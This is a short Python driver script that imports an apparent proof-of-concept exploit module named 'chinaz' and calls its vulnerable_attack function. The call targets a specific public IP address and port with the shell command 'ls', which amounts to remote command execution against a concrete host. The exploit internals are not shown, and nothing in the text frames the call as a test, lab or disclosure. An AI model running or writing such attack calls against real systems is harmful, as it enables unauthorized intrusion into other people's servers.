# import sys
# sys.path.append('../')
from games.poc import chinaz
print(chinaz.vulnerable_attack(target='42.192.96.35', target_port='8801', cmd='ls'))
